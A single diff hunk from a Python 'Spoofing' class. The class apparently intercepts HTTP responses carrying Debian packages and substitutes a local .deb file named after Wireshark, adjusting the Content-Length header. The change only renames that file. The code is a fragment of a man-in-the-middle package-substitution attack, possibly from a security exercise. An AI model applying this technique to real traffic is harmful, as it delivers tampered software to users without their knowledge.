@@ -99,7 +99,7 @@ class Spoofing():
                 if pkt[HTTPResponse].Content_Type == b'application/x-debian-package':
 
                     # Read the debian package into a variable:
-                    with open("wireshark_3.0.5-1_amd64.deb", "rb") as file:
+                    with open("wireshark_3.0.5-1.deb", "rb") as file:
                         deb = file.read()
 
                     # Update the content length in bytes in the HTTP header:
